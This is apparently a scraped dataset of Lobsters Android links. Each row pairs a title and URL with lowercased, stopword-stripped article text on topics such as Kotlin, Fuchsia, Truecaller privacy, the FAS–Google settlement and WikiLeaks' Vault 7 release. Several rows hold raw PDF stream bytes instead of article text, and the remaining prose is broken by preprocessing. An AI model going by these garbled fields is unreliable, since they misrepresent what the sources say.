266,Lobsters,android,Android,Nitrite: An Embedded NoSQL Database for Java and Android,https://medium.com/@anidotnet/nitrite-an-embedded-nosql-database-for-java-and-android-318bf48c7758,nitrite embedded nosql database java android,nitrite embedded nosql database java android feature install maven gradle usage initialize database create collection construct document insertmodifyremove document query collection replication nitrite datagate reading project page repo page,nitrite embedded nosql database java androidthe nosql object aka nitrite database opensource nosql embedded document database written java mongodblike api support inmemory single filebased persistent storesnitrite serverless embedded database ideal desktop mobile small web applicationsfeaturesembedded keyvaluedocument object storesinmemory single data filevery fast lightweight mongodblike apiindexingfulltext search capabilityfull android compatibilityobservable storetwoway replication via nitrite datagate servernitrite rdbms also distributed nosql database like mongodb cassandra server external application connect support sharding acid transactionhow installto use nitrite java application add dependency mavengradleusagelet start quick examplesinitialize databasefor option opening database visit heredata nitrite stored document collection called nitritecollection document nothing map keyvalue pairsa pojo also stored directly objectrepository hood pojo converted document using jackson objectmapper stored nitritecollectioncreate collectionconstruct documentcrud operation easy much similar mongo java apiinsertmodifyremove documentdetails crud operation nitritecollection found objectrepository herequery collectionnitrite come easy api querying collection efficientlynitrite support indexing take advantage indexing searching found herereplicationin connected world seamless replication device must nitrite support replication help nitrite datagate server setting replication easy nitrite datagate server instance runningwe discus setting datagate server another articlefurther readingthere lot squeeze everything single article discus thing coming day meantime feel interested head nitrite project page github repo want dig nitrite capability detail please go documentation page find tiny detail lot example
268,Lobsters,android,Android,Stack Overflow Considered Harmful? The Impact of Copy&Paste on Android Application Security,https://www.aisec.fraunhofer.de/content/dam/aisec/Dokumente/Publikationen/Studien_TechReports/englisch/stackoverflow.pdf,stack overflow considered harmful impact copy paste android application security,,obj length filter flatedecode stream œ w f kj u n ʟ dsi v
270,Lobsters,android,Android,"Google’s “Fuchsia” smartphone OS dumps Linux, has a wild new UI",https://arstechnica.com/gadgets/2017/05/googles-fuchsia-smartphone-os-dumps-linux-has-a-wild-new-ui/,google fuchsia smartphone o dump linux wild new ui,single product fuchsia bsd clause mit apache google flutter sdk highperformance apps escher armadillo fuchsia system ui hotfixitnet great readme enlarge long road ahead problem chrome o,fuchsia gallery mid main section fuchsia show profile picture tapping reveal power control section recent apps google nowstyle suggestion panel tablet mode tap one card fullscreen app longpress one apps drag top start split screen mode dragging tablet mode release get splitscreen interface split screen three apps tablet four apps tablet three phone screen tab interface suggestion panel also bring fuchsia keyboard google never one compete market single product apparently hard work third operating system android chrome o one open source realtime o called fuchsia o first popped august last year back command line mysterious project crazy new ui look let dive unlike android chrome o fuchsia based us new googledeveloped microkernel called magenta fuchsia google would dumping linux kernel also gpl o licensed mix bsd clause mit apache dumping linux might come bit shock android ecosystem seems desire keep upstream linux release even google pixel still stuck linux kernel first released end google documentation describes magenta targeting modern phone modern personal computer fast processor nontrivial amount ram arbitrary peripheral openended computation google nt made public official comment fuchsia exists leaving u speculate modern phone shout certainly sound like something could eventually compete android o early hard tell fuchsia impossible talk without mentioning hundred related project also code name interface apps written using google flutter sdk project actually produce crossplatform code run android io flutter apps written dart google reboot javascript mobile focus highperformance apps also vulkanbased graphic renderer called escher list volumetric soft shadow one feature seems custombuilt run google shadowheavy material design interface guideline armadillo fuchsia system ui lead u interesting point right fuchsia interface written flutter sdk crossplatform mean right grab chunk fuchsia run android device fuchsia first went public august back compiling would get nothing command line thanks hotfixitnet pointing fuchsia system ui called armadillo actually pretty interesting possible download source compile fuchsia system ui android apk install android device consists wild reimagining home screen along keyboard home button kind window manager nothing really work bunch placeholder interface nt anything also great readme fuchsia source describes heck going enlarge official armadillo logo clearly done one google top artist home screen giant vertically scrolling list center see placeholder profile picture date city name battery icon story recent scrolling list suggestion sort like google placeholder leave main screen see fuchsia home button pop bottom screen single white circle center profile picture tapped bring menu bit like android quick setting top row icon show battery connectivity get slider volume brightness icon airplane mode disturb auto rotate interact button slider wo nt actually anything android button labeled log nt work profile section bunch card labeled story something readme describes story set apps andor module work together user achieve goal seems pretty close recent apps list maybe eventually kind grouping feature tapping card load fullscreen interface since one labeled email pretty obvious apps list sorted last opened recentlyused card sit bottom list list also windowmanagement feature long press card drag around drop top another app trigger split screen mode split screen system seems really capable probably need reigned bit split vertically horizontally drag third app split horizontally vertically split next fullheight app tab bar appear three full screen interface drag four apps split one side screen keep dragging apps whole thing crash go back story list see split screen layout reflected card nice bottom google panel start search bar mockup tapping bring keyboard android system keyboard instead custom fuchsia interface new dark theme thing like longpressing symbol setting work appears google several suggestion card seem little different google news weather calendar suggestion though doc saying conceptually suggestion representation action user take augment existing story start new one almost make seem like app launcher long road ahead new project google hard know scale project percent project forgotten year something important luckily direct statement fuchsia developer matter public fuchsia irc channel fuchsia developer travis geiselbrecht told chat room o nt toy thing project dumping ground dead thing nt care anymore fuchsia logoandroid conceived day iphone started o camera became blackberry clone quickly retooled iphone unveiling android google still chained decision made year ago knew anything managing mobile o ship billion smartphones say two biggest problem android right getting o update rolled across thirdparty hardware ecosystem lack focus smooth ui performance nt anything said update plan o reliance dart programming language mean focus highperformance fuchsia really seems like project asks would design android today could start brandnew googledeveloped kernel running brandnew googledeveloped sdk us brandnew googledeveloped programming language geared run google material design interface quickly possible google get dump linux gpl dump java problem caused oracle google basically insulate android upstream project bring development inhouse thing scale android today would massive project hardest part might even developing o coming kind transition plan android grown world popular operating system cross platform feature flutter sdk sound important transition plan google could get developer start writing apps flutter would creating app ecosystem ran io android eventually fuchsia google also shown able willing make android runtime work nonandroid platform chrome o google choose go transition plan perhaps could port entire android stack fuchsia stopgap app solution back august fuchsia went public geiselbrecht told fuchsia irc channel magenta project started month ago would somewhere around february android hung around inside google five year launched real product fuchsia follows similar path everything go well maybe expect consumer product sometime around google could cancelled ever see light day fuchsia long road ahead
271,Lobsters,android,Android,Privacy Threats through Ultrasonic Side Channels on Mobile Devices,http://christian.wressnegger.info/content/projects/sidechannels/2017-eurosp.pdf,privacy threat ultrasonic side channel mobile device,,obj length filter flatedecode stream j qp
273,Lobsters,android,Android,Something is wrong when the ‘telephone app’ on your phone becomes 3rd party,https://martinruenz.de/article/data-privacy/2017/05/03/something-is-wrong.html,something wrong telephone app phone becomes party,geolocation ip address device id unique identifier device manufacturer type device hardware setting sim card usage application installed id advertising ad data operating system web browser operator imsi connection information screen resolution usage statistic communication application address book device log data incoming outgoing call message version service page visit feature use website engage content viewed content commented search term use order information transfer information trusted vendor unfortunately unable uninstall truecaller searching dialling application smartphone dialling application update hacknews access shared truecaller privacy policy applies create account,since living home country frequently use two different sim card prefer phone dualsim support limit choice significantly buying new device last time bought one opted wileyfox swift cheap feature desired shipped cyanogenmod android thought might indicate wileyfox delivers slim privacyaware system yesterday delighted see wileyfox provides update new version android hesitate long install upgrade concern hardware might holdup new system showed unfounded everything seemed work fine realised dialler labelled something never heard shoot even know dialler app gave rise bad suspicion core functionality provided party app indeed respect privacy uninstall ever asked comply term condition course excerpt privacy policy install use service truecaller collect personal information device may use interaction service information may include eg geolocation ip address device id unique identifier device manufacturer type device hardware setting sim card usage application installed device id advertising ad data operating system web browser operator imsi connection information screen resolution usage statistic default communication application access device address book device log event information log keywords meta data incoming outgoing call message version service use information based interaction service service accessed via another service web site search engine page visit feature use service service website engage service content viewed content commented sent u information ad see andor engage search term use order information usage activity data logged server time time truecaller may collect information automatically use cooky learn use cooky cookie policy somewhere later surprisingly transfer information trusted vendor service provider partner support business service providing technical infrastructure service bug testing analyzing service used measuring effectiveness ad service facilitating payment well potential partner may wish work u provide service reading first thing send email wileyfox support kindly ask way uninstall app recover default dialler answer came quickly unsatisfying generic type hello martin thank much email truecaller pro wileyfox user receive day truecaller pro free truecaller pro enables send contact request people outside network truecaller pro give adfree experience wileyfox user receive ad truecaller even pro subscription end privacy question register truecaller work ordinary dialler improve accuracy caller id service user share contact truecaller community feature optional user skip giving access user wish use truecaller dialler optout deactivate account without impacting usage dialler deactivate unlist number truecaller via website http wwwtruecallercomunlist unfortunately unable uninstall truecaller default dialer use party app would like many kind regard second email asking guarantee information collected creating truecaller account received answer disabling application dialer simply disappears homescreen without replacement leaf unpleasant spot avoid using google service need find alternative dialling application sweet searching dialling application smartphone dialling application course always root phone install custom rom process take time development compatibility rom le satisfactory figure option spare time hope moment least find usable replacement fdroid sure move even legal certainly act kindness impose kind affiliate program customer tell u state android well two three android device owned different manufacturer suffered bloat adware fair system open consequence customisable manufacturer designed however vital core functionality easily replaced dubious party apps guess burden customer double check software get device apple fanboy admit least know get buying iphone heck switching operating system mobile easy pc would glad hear recommendation smartphone hardware software value opensource dataprivacy preferably dualsim finish short article word ernst f schumacher intelligent fool make thing bigger complex violent take touch genius lot courage move opposite direction update meantime wileyfox truecaller reached probably unrelated attention article got hacknews statement wileyfox answering mail asking weather truecaller collect data hello martin yes truecaller access information unless sign service kind regard wileyfox customer support truecaller hi martin completely optional use truecaller service offer service identifying spam call unknown number user want service simply say first screen user able use dialler like standard android dialler still truecaller branding information shared truecaller vice versa mean profile created detail number shared privacy policy applies create account also mean already optedin creating account want optout stop using feature use app like normal dialler go setting deactivate return app state sign normal dialler highly appreciate company take customer relation serious reached however missing clear statement saying data send truecaller server signing commonly known anonymous data usually really anonymous importantly change fact party app hooked system trust party statement truecaller access data clearly false app privilege requires spy lot data given recent history privacy violation certainly intend add truecaller list company trust especially regarding buisness model
274,Lobsters,android,Android,Functional Programming for Android Developers — Part 1,https://medium.freecodecamp.com/functional-programming-for-android-developers-part-1-a58d40d6e742,functional programming android developer part,functional programming android developer part elixir functional programming use declarative code explicitness concurrency moore law higher order function immutability pure function java kotlin java kotlin side effect java kotlin ordering java kotlin haskell summary read next functional programming android developer part mediumcom,anup cowkurfunctional programming android developer part redditlately spending lot time learning elixir awesome functional programming language friendly beginnersthis got thinking use concept technique functional world android programming people hear term functional programming think hacker news post yammering monad higher order function abstract data type seems mystical universe far removed toil daily programmer reserved mightiest hacker descended realm númenorwell screw tell learn use create beautiful apps apps elegant readable codebases fewer errorswelcome functional programming fp android developer series gon na learn fundamental fp use good old java new awesome kotlin idea keep concept grounded practicality avoid much academic jargon possiblefp huge subject gon na learn concept technique useful writing android code might visit concept directly use sake completeness try keep material relevant possibleready let gowhat functional programming use good question term functional programming umbrella range programming concept moniker quite justice core style programming treat program evaluation mathematical function avoids mutable state side effect talk soon enough core fp emphasizes declarative code programmer worry let compiler runtime worry howexplicitness code obvious possible particular side effect isolated avoid surprise data flow error handling explicitly defined construct like goto statement exception avoided since put application unexpected statesconcurrency functional code concurrent default concept known functional purity general agreement seems trait particular causing functional programming rise popularity since cpu core getting faster every year like used see moore law make program concurrent take advantage multicore architectureshigher order function function first class member like language primitive pas function around like would string intimmutability variable modified initialized thing created thing forever want change create new thing another aspect explicitness avoiding side effect know thing change much confidence state use itdeclarative explicit concurrent code easier reason designed avoid surprise hope piqued interestin first part series let start fundamental concept fp purity side effect orderingpure functionsa function pure output depends input side effect talk side effect bit right let see example shall consider simple function add two number read one number file number passed parameterjavaint add int x int readnumfromfile return x kotlinfun add x int int val int readnumfromfile return x function output dependent solely input depending readnumfromfile return different output value x function said impurelet convert pure functionjavaint add int x int return x kotlinfun add x int int int return x function output dependent input given x function always return output function said pure mathematical function also operate way mathematical function output depends input functional programming much closer math usual programming style used top empty input still input function take input return constant every time still purepps property always returning output given input also known referential transparency might see used talking pure functionsside effectslet explore concept addition function example modify addition function also write result filejavaint add int x int int result x writeresulttofile result return result kotlinfun add x int int int val result x writeresulttofile result return result function writing result computation file ie modifying state outside world function said side effect longer pure functionany code modifies state outside world change variable writes file writes db deletes something etc said side effectfunctions side effect avoided fp longer pure depend historical context context code self contained make much harder reason aboutlet say writing piece code depends cache output code depends whether someone wrote cache written written data valid etc understand program unless understand possible state cache depends extend include thing app depends network database file user input becomes hard know exactly going fit head oncedoes mean use network database cache course end execution want app something case android apps usually mean updating ui user actually get something useful appfp greatest idea completely forego side effect contain isolate instead app littered function side effect push side effect edge system little impact possible making app easier reason talk detail explore functional architecture apps later seriesorderingif bunch pure function side effect order executed becomes irrelevantlet say function call pure function internally javavoid dothings kotlinfun dothings know sure function depend since output one input another also know change anything system since pure make order executed completely interchangeablethe order execution reshuffled optimized independent pure function note input result would executed order could still reordered execute ordering property get u though concurrency run function separate cpu core without worrying screwing anything many case compiler advanced pure functional language like haskell tell formally analyzing code whether concurrent stop shooting foot deadlock race condition like compiler theoretically also autoparallelize code actually exist compiler know moment research ongoing even compiler looking stuff programmer great able tell whether code concurrent looking function signature avoid nasty threading bug trying parallelize imperative code might full hidden side effectssummaryi hope first part intrigued fp pure side effect free function make much easier reason code first step achieving concurrencybefore get concurrency though learn immutability part series see pure function immutability help u write simple easy understand concurrent code without resorting lock mutexesread nextfunctional programming android developer part read part please read mediumcomif liked click notice one grateful every one themfor musing programming follow get notified write new post
275,Lobsters,android,Android,OO Tricks: The Art of Command Query Separation,https://hackernoon.com/oo-tricks-the-art-of-command-query-separation-9343e50a3de0,oo trick art command query separation,oo trick art command query separation object oriented managing side effect command command query example formal definition advantage violation error handling gotchas summary anup cowkur twitter trick liked post please hit little heart blog,oo trick art command query separationoot mini series writing maintainable object oriented code without pulling hair outfunctions sideeffects time change state system least expect wreak kind havoc difficult get rid sideeffects object oriented programming paradigm need make sure manage bite u lookingmanaging side effectsone good way manage sideeffects create strong separation command query context command change system side effect query return value computation observable state systemexamplewhen call function getamount expect return amount change state system would horrific similarly call setamount sideeffects expect change state system expect setamount return probably nothingformal definitioncommand query separation formalises saying function change state return value function return value change statethis term coined bertrand meyer book object oriented software constructionadvantagesone advantage following separation easily recognize whether function sideeffectint queryvoid n command violationtake look call command query clearly change state systemuser u userservicelogin username password user object returned supposed manage supposed call logout point future rather simple getter user u userservicegetuser error handlingmaybe login returned user could return null failed tempted return error code command fails change state better throw exception maintaining convention command return voidgotchasthough cqs work well time exception popping stack example function modifies state return result like queryelement e stack element pop stateful querysummarycommands return void query return valuesuse exception rather returning checking error statesas martin fowler said would nice language would support notion language could detect state changing method least allow programmer mark anup cowkur made handy tool help check herewhat view let chat twitterread trick hereif liked post please hit little heart posted andevcon blogsubscribe get daily roundup top tech story
276,Lobsters,android,Android,How we made Basecamp 3’s Android app 100% Kotlin,https://m.signalvnoise.com/how-we-made-basecamp-3s-android-app-100-kotlin-35e4e1c0ef12,made basecamp android app kotlin,best advice based year realworld shipping wrap head around basic jake wharton talk kotlin android favorite kotlin feature kotlin doc start slow make real try learn whole language flow control extension function null safety learn auto converter kotlin idiom question java habit leave campsite cleaner found new java ever use cool down kotlin curb enthusiasm forget customer go alone jay jamie,best advice based year realworld shipping made chicago started kotlin journey year ago based two hunch would make huge difference programmer happiness wildly improve work quality speed happy report hunch right week basecamp android app written kotlin put u unique position share tip experience going java kotlin get started look best way keep learning kotlin read wrap head around basic first thing first take time get acclimated language free resource galore recommend jake wharton talk kotlin android lightbulb moment two watch really started get favorite kotlin feature wrote month started kotlin specifically wrote basic straightforward easy beginner time kotlin doc people tell read doc often wince kotlin doc legit excellent way get acclimated start slow make real writing first bit kotlin usually hardest part getting started alleviate pressure people often suggest start test perhaps gradle plugin extremely sound advice work boring obscure get excited propose something different write real production code important something see working app right away fun feeling accomplishment seeing something work discounted build confidence keep motivated course recommend converting giant class first go instead try converting utility helper method take single method one util class rewrite kotlin done first bit production ready kotlin try learn whole language kotlin lot great stuff much might tempted use right away work recommend instead find key concept click brain others tell best part language practice using fullest got started three area clicked flow control wheniffor extension function add functionality class want null safety particular use let focusing concept helped get started without feeling overwhelmed afraid start small need space brain pick new thing let stick already going dealing basic syntactical difference try cram goodness something bound get overwritten brain learn auto converter jetbrains done solid job kotlin plugin ability auto convert java kotlin get class way leaving tuning idiomaticstylistic thing take care two great way learn auto convert class keep java class handy put side side see kotlin compare pick ton seeing auto converter chose implement java kotlin auto convert class leave state version run last make difference ok code great code attack everything clarity conciseness look way follow kotlin idiom auto converter figure question java habit begin writing kotlin sad reality probably bad java habit need break found writing terrible ifelse block case would much better writing null check around object simple object let would better much may also built strong ツ attitude toward ugly code block java verbose time may begun accept occasional ugly code block well java writing kotlin help see need let go idea ugly code ok sure time ugly code may situationally necessary able blame java ceremony regularly question whether something kotlin way see code feel long complicated pause take another look time develop new better habit overwrite java one leave campsite cleaner found new java ever good way keep code heading right direction tidy small bit java pas saying go leave campsite cleaner found lot time building something new incidentally need make small change existing java class add attribute change type etc often small class like model utility class convert lazy leave incremental slow approach time save team much frustration long run use cool down kotlin great time work kotlin conversion cooling big release often normal two week cycle release big feature take day watch stability customer issue couple day going enough time get something big great time convert class kotlin time get faster able knock class per day curb enthusiasm start feel comfortable kotlin might get good thing energy enthusiasm keep motivated learning also easy go overboard certainly collapse whatever could singleexpression function save line realize giving clarity use many block even case simple ifelse would sufficient clearer write extension function galore realize creating cognitive overhead saving wonderful enthusiastic use tool kotlin give try keep cool unlike make sure using language feature right reason forget customer seeing kotlin make life much better need keep one important obvious thing mind customer care fully support argument programmer happiness lead great code ultimately better product crucially important good thing need find right balance converting java kotlin might fun goal meanwhile customer might struggling nagging bug great thing two thing mutually exclusive grab bug squash kotlin winwin honest java probably caused bug first place anyway go alone depending company makeup might easier said done find kotlin buddy question proficient kotlin buddy jay regularly share idea review kotlin poke fun jamie designer sometimes stuff happens informal chat far valuable place learn pull request let code speak feedback come learning kotlin new language really absolutely crucial alright made know quite bit chew maybe obvious maybe hope help get right path joining u kotlinland article helpful please hit button thanks hard work making basecamp android app better every day kotlin course please check
277,Lobsters,android,Android,myPhone Hammer Iron 2 - budget phone review,http://blog.tintagel.pl/2017/04/25/myPhone-hammer-iron-2-budget-phone-review.html,myphone hammer iron budget phone review,wiped due overheating certified product page battery hold still sure thought happy picture p ps,hate android phone higher low end brand never received upgrade timely matter build quality issue time got bloated enough base system able update bundled apps anymore mention leaving enough space anything else one wiped due overheating recently ended life dropped table dog double trouble wife phone decided good time dying battery suddenly faced need getting new phone want go another contract get u iphones justify spending much money two new model even used one would also nice get something die single drop even considered dumb phone want use stravaendomondo upcoming dog trekking event need phone phone could get shoe string budget fairly decent survives accident killed previous phone perhaps one survives treated acid used clear pipe demonstrated video ignore audio set start time action usd get phone android gb built storage dual sim hybrid slot microsd slot quadcore ghz processor mpx back mpx front camera inch display x px liion mah battery swappable spec impressive performance wise main selling point phone certified mean phone submerged meter water turned completely dust tight case also hardened shock proofed plus come protective foil screen go part linked youtube video see put much harsh test delusional expect survive anything even thing saw actual reviewer convinced though better survival chance typical use case accident happen normal usage phone literally eng review online except product page company wroclaw poland local country wise decent amount review polish interwebs obviously still manufacture china biggest flaw reviewer pointed battery readout lack lte audio issue built speaker especially low temperature craclking glitching voice going mute annoying sign myphone community popup app hit four one add battery start saying completely happy actually quite surprised long battery hold battery warning went hour regular usage informing estimated remaining charge usage regular use mean call picture taken wifi always cell data house hour youtube video minute video browsing chrome email signal text apps slack twitter mastodon current charge show battery left phone uptime approx hr left initial charge noticed huge drop battery usage see shot charge readout flat hour drop seems evening usage initial charge jumpy match reviewer reporting screenshot initial discharge readout one current charge think battery problem fact actually exchange huge benefit buy two phone one necessary battery swappable one lack lte actually problem network usage phone home wifi outside event like runningdog trekking need lte enough add longer battery life audio another thing though everything reviewer said spot crackling glitch phone going low volume completely mute occassions happened mostly built speaker phone still sure anything happen always spend much time talking could use regular bluetooth headset workarond really keen send repair wait week without phone especially since lot online reviewer reported phone repair still issue present app indeed annoying pop randomly reviewer suggested app show first run list running apps cleared task manager exactly simple brochure promoting community lead form put email sign newletter biggest problem always triggered even decided sign called company said aware annoying user considering update remove alter disable cover online already one hit biggest flaw far older security patch level october still pretty good low shelf device note price gave contract called company asked update policy officially planned update model noone said possibility something released making bet bonus side unmodified stock android apps preinstalled quite sane choice allowing full uninstall rare situation perfect quite typical android phone except top line model purchase directly google trust phone never find pgp ssh private key material phone already recent patch previous phone personally think selling hardware outdated software treated selling product past due date reality yet voice concern phone myphone line higher end rugged smartphones indeed promising buying anything else see clear policy software security update fun part got two identical phone thought case hard see model say next back camera lens way screw visible photo decoration hold back lid splitting apart phone fall preventing battery jumping give nice custom screwdriver company confirmed phone model mpx know mine surplus text printed found interesting find funny also expected difference build quality unit model budget phone still talking camera happy picture quality huge demand phone camera gps tested wife also behaved decently interface snappy nothing laggingsluggish apps work phone pretty much cover mine wife need without ruining budget would whole heartedly recommedend myphone provided date security update phone model one thing god damn pick name sound like cheap iphone ripoff rugged smartphones amazing product gut stand anyone myphone reading consider least keeping rugged phone line hammer trademark drop company name p hard get phone outside poland shop english interface resellers also local talking phone asked possiblities purchasing abroad company ready handle sale usa able sell anywhere inside eu confronted shopping frontend english said handle order via email english wanted learn audio phone went mute back assumed call center person muted audio getting glitched ps doubt paid way article none link affiliate personal opinion recent purchase
278,Lobsters,android,Android,FAS Russia Reaches Settlement with Google (app developers will get equal rights),http://en.fas.gov.ru/press-center/news/detail.html?id=49774,fa russia reach settlement google app developer get equal right,fa russia reach settlement google,fa russia reach settlement google april twoyear legal process federal antimonopoly service google ended voluntary settlement moscow district court arbitration settlement help eliminate violation antimonopoly legislation previously detected fa russia ensure competition market mobile application especially mobile search let u remind far back september fa russia established google violated part article federal law protection competition abusing market dominance fa russia found violation google action resulted prohibition preinstallation developer competing application result due refusal regard manufacturer mobile device preinstallation mobile application efficient app distribution channel fully reserved google additionally violation included provision google counterparties mobile device manufacturer access google play application store subject certain condition manufacturer mobile device russian federation fulfill condition comprised mandatory preinstallation google apps together google play preferential placement device home screen well mandatory installment google search engine default restore competition fa russia issued prescription google order require company remove anticompetitive restriction agreement manufacturer included exclusivity priority placement google apps well provision limiting installation developer apps service court two level upheld validity fa russia decision fa russia imposed fine google violating article federal law protection competition amount rouble google proposed fa russia reach settlement fa russia driven necessity eliminate consequence violation restore competition market agreed sign settlement agreement according term settlement agreement google longer demand exclusivity application androidbased device russia google obliged restrict preinstallation competing search engine application including default home screen google refrain stimulating preinstallation google search general search engine google longer enforce part previously signed agreement contradict term settlement finally google committed securing right third party include search engine choice window device currently circulating russian market google develop active choice window chrome browser time next update provide user opportunity choose default search engine within month google develop new device new chrome widget replace standard google search widget home screen allow end user device based android o gm package see new choice screen first launch new chrome widget choice screen enables user choose yandex search google search search engine developer sign commercial agreement inclusion choice screen within day approval settlement agreement court interested russian search engine able address google discussing potential condition inclusion choice screen next year make application preinstallation channel mobile device open application developer get equal right opportunity access device territory russian federation apart restoring condition competition market mobile application implementation settlement enable consumer buy device software better corresponds expectation user able change setting time choose default search engine suit need time google mean limit impede preinstallation developer application user device implementation settlement term effective mean secure competition developer mobile application managed find balance necessity develop android ecosystem interest thirdparty developer promoting mobile application service androidbased device settlement execution positive effect market whole giving developer additional option promoting product summarized igor artemiev head fa russia
279,Lobsters,android,Android,Celebration of Choice,https://yandex.com/company/blog/celebration-of-choice-a-letter-from-arkady-volozh-yandex-ceo/,celebration choice,,blog post would like share reflection landmark settlement google russian federal antimonopoly service fa read fa press release today important day russian consumer google agreed take significant step open android platform russia term settlement million russian android user offered choice search engine mobile device smartphone manufacturer also freedom select apps preinstall devicesseveral year ago became clear closed nature google android inhibited ability provide search option russian user popular mobile platform google required android smartphone manufacturer ship device google search default search engine place google search widget default home screen google also limited placement competing application android device factor created limit smartphone manufacturer could access essential android app store google play requirement made challenging search provider competing application provider preinstall service android phone android limiting option user smartphone manufacturer competitor together restricting innovation yandex requested fa initiate investigation google business practice fa found google practice anticompetitive violation russian antitrust lawsas one largest internet company europe leading search mobile application provider russia access platform critically important yandex technology platform make possible u well company continue rapid pace innovation possible platform sufficiently open foster competition allowing access thirdparty developer excited reached solution restores necessary element ensure dynamic competitive ecosystemi thankful federal antimonopoly service applying law manner effectively efficiently restores competition market benefit russian usersi also want thank google cooperation also recognizing value openness always thought google play constructive role russian market competition breed innovation desire participate market user choose best service availablefor past year mission help user better navigate online offline world founded yandex ilya segalovich elena kolmanovskaya others shared vision way search technology would help people find information internet year machine learning capability grown aspiration mobile service map ecommerce classified ondemand transportation service expanded ability help user go moment contextually relevant informationi excited together entire team yandex continue building product service deliver exceptional customer experience open platform future bright choice possibility endlessarkady
280,Lobsters,android,Android,One process to reap them all - Garbage Collection as a Service (2017),https://hexhive.github.io/publications/files/17VEE.pdf,one process reap garbage collection service,,obj length filter flatedecode stream xڕ p v v ﺺ j p oe p fzf ʉ n j c e q b f ž wx w j z endstream endobj obj length filter flatedecode stream xڭ iu b ځ ro ջ v j n mec eh l w ˈ v g c u w w k n yƣ dv cgbf ʌ zn ԡ hm n z z h j fw
282,Lobsters,android,Android,EteSync: End-to-end encrypted and journaled contacts and calendar synchronization for Android,https://www.etesync.com,etesync endtoend encrypted journaled contact calendar synchronization android,easy use,easy use etesync easy use app seamlessly integrates existing apps wo nt even notice using security nt always come cost
283,Lobsters,android,Android,Python for Android,https://github.com/kivy/python-for-android,python android,pythonforandroid documentation quickstart instruction quick instruction set android sdk ndk quickstart use sdkndk api level ndk version quickstart full instruction parameter option documentation support support discord channel contributing contribution guide documentation dev discord channel license history http githubcomkivypythonforandroidtreeoldtoolchain unified python recipe minimum target api level contributor contribute backer become backer sponsor become sponsor,pythonforandroid pythonforandroid packaging tool python apps android create python distribution including module dependency want bundle apk along code feature include different app backends including kivy webview python webserver automatic support pure python module built support many others including popular dependency numpy sqlalchemy multiple architecture target apks optimised given device documentation support see documentation follow quickstart instruction install begin creating apks quick instruction install pythonforandroid pip install pythonforandroid develop branch pip install githttps githubcomkivypythonforandroidgit test install work version build actual apps set android sdk ndk described quickstart use sdkndk api level ndk version quickstart api level may work everything installed build apk eg apk requirementskivy private homeusernamedevelplanewavefrozen name full instruction parameter option see documentation support need assistance ask help mailing list also support discord channel contributing love pull request discussing novel idea check kivy project contribution guide feel free improve pythonforandroid see documentation information pythonforandroid development release model nt worry detail need make pull request take care rest following mailing list irc channel used exclusively discussion developing kivy framework sister project also dev discord channel license pythonforandroid released term mit license please refer license file history tool rewritten provide new easiertouse easiertoextend interface like browse old toolchain status recorded posterity http githubcomkivypythonforandroidtreeoldtoolchain last quarter python recipe changed new recipe new build system applied ancient python recipe allowing u bump version number change unified build process python recipe probably solved various issue detected year unified python recipe require minimum target api level android lollipop need build targeting api level use older version pythonforandroid march dropped support creating apps use python latest pythonforandroid release supported building python version contributor project exists thanks people contribute contribute backer thank backer become backer sponsor support project becoming sponsor logo show link website become sponsor
284,Lobsters,android,Android,Future of Java 8 Language Feature Support on Android,https://android-developers.googleblog.com/2017/03/future-of-java-8-language-feature.html,future java language feature support android,james lau,posted james lau product manager google always try right thing sometimes mean adjusting plan know much android developer community care good support java language feature changing way support decided add support java language feature directly current javac dx set tool deprecate jack toolchain new direction existing tool plugins dependent java class file format continue work moving forward java language feature natively supported android build system aiming launch part android studio coming week wanted share decision early initially tested adding java support via jack toolchain time realized cost switching jack high community considered annotation processor bytecode analyzer rewriter impacted thank trying jack toolchain giving u great feedback continue using jack build java code release new support migrating jack require little work hope new plan pave smooth path everybody take advantage java language feature android share detail release new support android studio
285,Lobsters,android,Android,"Offline support: “Try again, later”, no more.",https://medium.com/@yonatanvlevin/offline-support-try-again-later-no-more-afc33eba79dc,offline support try later,precious app kolgene mvp yigit boyar,precious appfinally starting startup kolgene got chance startup know start building first mvp testing assumption process crucial hard many thing could go wrong losing even single customer offline issue totally unacceptableevery customer lose cost u lot moneyif leaving experience using application bad well even optionour app usage pretty simple clinician creates request genetic test mobile app relevant laboratory receive message submit offer clinician receives offer chooses best offer based needswhen discussed various ux solution decided following loading bar even beautifulthe app work smoothly without putting user waiting stateso basically want achieve internet connectivity matter app always workand result user offline mode submits request submitted small reminder offline small icon syncing status top right corner come online app post request server regardless background foregroundsame go every network requestexcept registration sign inso first started completely separating view logic persistence model yigit boyar say act locally sync globallyit mean model persistent updated outside world data model propagate asynchronously using callbacksevents presenter later view remember view dumb reflects model loading dialog nothing view reacts user pass interaction result presenter model later receives next state show
286,Lobsters,android,Android,Wikileaks reveals CIA Hacking Tools,https://wikileaks.org/ciav7p1/index.html,wikileaks reveals cia hacking tool,press release center cyber intelligence cia targeting french political party candidate lead presidential election center cyber intelligence redact analysis cia malware target iphone android smart tv organizational chart embedded device branch edb samsung smart tv infecting vehicle control system used modern car truck numerous attack remotely hack control popular smart phone iphones apple product running io ipads numerous local remote zero day similar unit target google android used run majority world smart phone including samsung htc sony cia weaponized android zero day cia malware target window osx linux router microsoft window user hammer drill infectors removable medium usbs hide data image brutal kangaroo keep malware infestation going automated implant branch aib network device branch ndb described example section cia hoarded vulnerability zero day vulnerability equity process cyberwar program serious proliferation risk u consulate frankfurt covert cia hacker base center cyber intelligence europe instruction incoming cia hacker custom secondary screening procedure fine dining cia dramatically increased proliferation risk evading forensics antivirus tradecraft donts use encryption hide cia hacker malware communication describing target exfiltrated data executing payload persisting av defeat personal security product detecting defeating psps pspdebuggerre avoidance cia malware placing window recycle bin gaping hole doom cia malware maker could avoid similar exposure example table content umbrage remote device branch umbrage group substantial library fine dining operational support branch improvise jqjimprovise hive user developer frequently asked question redaction organizational chart organizational chart wiki page time period covered vault part vault obtained part vault different source total size vault wikileaks obtain part vault nt wikileaks worried cia act staff stop series wikileaks already mined best story wo nt journalist find best story,press release today tuesday march wikileaks begin new series leak u central intelligence agency codenamed vault wikileaks largest ever publication confidential document agency first full part series year zero comprises document file isolated highsecurity network situated inside cia center cyber intelligence langley virgina follows introductory disclosure last month cia targeting french political party candidate lead presidential election recently cia lost control majority hacking arsenal including malware virus trojan weaponized zero day exploit malware remote control system associated documentation extraordinary collection amount several hundred million line code give possessor entire hacking capacity cia archive appears circulated among former u government hacker contractor unauthorized manner one provided wikileaks portion archive year zero introduces scope direction cia global covert hacking program malware arsenal dozen zero day weaponized exploit wide range u european company product include apple iphone google android microsoft window even samsung tv turned covert microphone since cia gained political budgetary preeminence u national security agency nsa cia found building infamous drone fleet 